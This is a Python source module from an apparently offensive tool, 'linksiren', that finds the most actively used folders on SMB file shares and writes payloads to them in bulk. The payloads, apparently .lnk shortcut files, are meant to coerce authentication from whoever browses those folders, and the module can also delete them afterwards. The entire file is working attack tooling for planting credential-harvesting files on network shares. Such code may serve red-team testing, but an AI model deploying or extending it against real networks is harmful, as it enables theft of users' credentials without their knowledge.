"""
Author: George Hamilton
Description: This module is used to rank and filter the optimal share locations for deploying
payloads that coerce authentication based on recent access. This module can then be used to bulk
deploy multiple types of payloads to the identified locations. Lastly, this module can be used to
bulk cleanup multiple types of payloads from the identified locations.
"""
from pathlib import Path
from smbclient import scandir, remove, open_file
from smbprotocol.exceptions import SMBException
from linksiren.pure_functions import is_active_file, sort_rankings

def write_payload_local(payload_name, payload_contents):
    """
    write_payload_local(payload_name, payload_contents)

    :param str payload_name: File name, including extension, of the payload
    :param str payload_contents: Contents to write to the payload file


    :return: A bool indicateing whether or not the payload was written successfully.

    Accepts a folder path, payload name, and payload contents. Writes the supplied contents
    to the specified file and folder. Returns a bool indicating if the payload was written
    successfully.
    """
    extension = Path(payload_name).suffix

    if extension == '.lnk':
        mode = 'wb'
        newline = '\r\n'
    else:
        mode = 'w'
        newline = None

    try:  # Try to write the payload
        with open(payload_name, mode=mode, newline=newline) as payload_file:
            payload_file.write(payload_contents)
    except:  # Print a message and don't track the folder if writing the payload to it fails
        print(f'Failed to write payload at: {payload_name}')
        return False

    # If writing the payload doesn't fail, then return True
    return True


def read_targets(targets_file):
    """
    read_targets(targets_file)

    :param str targets_file: Path to a text file containing UNC paths to file shares and base
    directories.
    :return: List of target UNC paths

    Reads in a list of targets from a specified file path and returns a list of targets.
    Catches an exception and prints an error if the targets file does not exist.
    """
    targets = []

    # Read share targets into an array
    try:
        with open(targets_file, 'r', encoding="utf-8") as file:
            targets = file.read().splitlines()
    except:
        print('Error opening targets file. Make sure it exists and review its permissions.')

    return targets


def review_folder(folder_rankings, unc_path, active_threshold_date, depth, fast):
    """
    review_folder(folder_rankings, unc_path, active_threshold, depth, fast)

    :param dict folder_rankings: Dictionary of folder UNC paths and rankings reflecting the number
    of active files in the folder. {<folder UNC path>: <ranking>}
    :param str unc_path: UNC path for the current folder being reviewed
    :param int active_threshold: Number of days within which file access constitutes a file being
    active
    :param int depth: Number of layers of folders to search. 1 searches only the specified folder
    and none of its subfolders.
    :param bool fast: If True, the current folder will be marked as active as soon as a single file
    is found. A rank of 1 will be assigned to all active folders.

    :return: Dictionary of folder UNC paths as keys and rankings as values

    Iterates over files and subfolders starting at the specified UNC path up to the
    specified depth. Each folder is assigned a rank, tracked in folder rankings by its
    UNC path, based on the number of active files it contains. Active files are files
    accessed within the number of days specified in active threshold. If fast is set
    to True, then the folder will receive a rank of 1 or 0 depending on if it contains
    at least one active file or none.
    """
    ranking = 0
    folders = []
    reviewed = False
    depth_reached = depth <= 1
    # Use scandir as a more efficient directory listing as it already contains info like stat and
    # attributes.
    for file_info in scandir(unc_path):
        reviewed = fast and ranking > 0 # Review completed if in fast and ranking is non-zero

        # If folder is active and max_depth is reached
        if reviewed and depth_reached:
            break  # Stop reviewing items in the folder

        # For active files in the directory when the review is not yet completed
        elif not reviewed and file_info.is_file() and is_active_file(file_info.stat().st_atime, active_threshold_date):
            ranking += 1 # Increment the folder ranking

        # For subfolders in the directory
        elif file_info.is_dir() and not depth_reached: # If max depth is not reached
            folders.append(f'{unc_path}\\{file_info.name}')

    # Recursion: Call this function on all subfolders to review them if max depth is not reached.
    # Update folder_rankings as each subfolder is reviewed.
    if not depth_reached:  # If the max depth has not been reached
        for subfolder_unc in folders:
            folder_rankings = {**folder_rankings, **review_folder(folder_rankings, subfolder_unc,
                                                              active_threshold_date, depth - 1, fast)}
            # Requires python 3.9 or greater, commented for >= python 3.5 compatability
            # folder_rankings = folder_rankings | review_folder(folder_rankings, subfolder_unc,
            #                                                  active_threshold_date, depth - 1, fast)

    # Update folder_rankings with the rank of the current folder and return it
    folder_rankings[unc_path] = ranking
    return folder_rankings


def get_rankings(targets, active_threshold_date, max_depth, go_fast):
    """
    get_sorted_rankings(targets, active_threshold, max_depth, go_fast)

    :param list targets: List of UNC paths to shares and base directories to review.
    :param int active_threshold: Number of days within which file access constitutes a file being
    active
    :param int max_depth: Number of layers of folders to search. 1 searches only the specified
    target UNC paths and none of their subfolders.
    :param bool go_fast: If True, folders will be marked as active as soon as a single file is
    meeting the active_threshold criteria is found. A rank of 1 will be assigned to all active
    folders.

    :return: A dictionary in the format {<folder UNC path>: <ranking>} sorted by ranking

    Accepts a list of UNC paths to file shares and base directories. Gets the ranking associated
    with each folder based on the number of files active within the active_threshold number of days.
    Recursively assigns ranking to subfolders up to max_depth. If go_fast is enabled, assigns the
    rank of 1 to all folders with a single active file and moves on to the next folder. Returns a
    dirctionary of UNC paths and associated rankings. Catches exceptions for failed smb connections
    and prints a message describing the error.
    """
    # Track rankings for each folder, which are (counterintuitively) scores corresponding to the
    # number of active files in a folder. {<folder UNC path>: <ranking>}
    folder_rankings = {}
    for share in targets:
        try:
            # Call the appropriate review function based on the fast argument
            folder_rankings = review_folder(folder_rankings, share, active_threshold_date,max_depth,
                                            go_fast)

        except SMBException as e:
            print(f"Error connecting to {share}: {e}")

    return folder_rankings


def get_sorted_rankings(targets, active_threshold_date, max_depth, go_fast):
    # Get rankings for folders
    folder_rankings = get_rankings(targets, active_threshold_date, max_depth, go_fast)

    # Sort the folder UNC paths by rankings
    sorted_rankings = sort_rankings(folder_rankings)
    return sorted_rankings


def write_list_to_file(input_list, file_path, mode='w'):
    """
    write_list_to_file(list, file_path)

    :param list list: A list
    :param str file_path: Path to a file to which to write
    :param str mode: String indicating the mode in which to open the output file.
    Defaults to 'w' for write.

    Writes items in a list to a specified file, one per line.
    """
    with open(file_path, mode=mode, encoding="utf-8") as f:
        for item in input_list:
            f.write(item + '\n')


def write_payload_remote(folder_unc, payload_name, payload_contents):
    """
    write_payload_remote(folder_unc, payload_name, payload_contents)

    :param str folder_unc: UNC folder path to which the payload should be written
    :param str payload_name: File name, including extension, of the payload
    :param str payload_contents: Contents to write to the payload file


    :return: A bool indicateing whether or not the payload was written successfully.

    Accepts a fold UNC path, payload name, and payload contents. Writes the supplied contents
    to the specified file and folder. Returns a bool indicating if the payload was written
    successfully.
    """
    payload_unc = f'{folder_unc}\\{payload_name}'
    extension = Path(payload_name).suffix

    if extension == '.lnk':
        mode = 'wb'
        newline = None
    else:
        mode = 'w'
        newline = '\r\n'

    try:  # Try to write the payload
        with open_file(payload_unc, mode=mode, newline=newline) as payload_file:
            payload_file.write(payload_contents)
    except:  # Print a message and don't track the folder if writing the payload to it fails
        print(f'Failed to write payload at: {payload_unc}')
        return False

    # If writing the payload doesn't fail, then return True
    return True


def delete_payload(payload_folder, payload_name):
    """
    delete_payload(folder_unc, payload_name, payload_contents)

    :param str payload_folder: UNC path to a folder containing a paylaod
    :param str payload_name: File name, including extension, of the payload

    :return: A bool indicateing whether or not the payload was deleted successfully.

    Accepts a payload folder and payload name. Attempts to delete the payload from
    from the specified folder. Returns a bool indicating if the payload was written
    successfully.
    """
    payload_unc = f'{payload_folder}\\{payload_name}'
    try:  # Try to delete the payload file
        remove(payload_unc)
    except:  # Print a message if deletion fails
        print(f'Failed to delete payload at: {payload_unc}')
        return False
    return True


def get_lnk_template(template_path):
    with open(template_path, 'rb') as lnk:
        shortcut_bytes = list(lnk.read())

    return shortcut_bytes
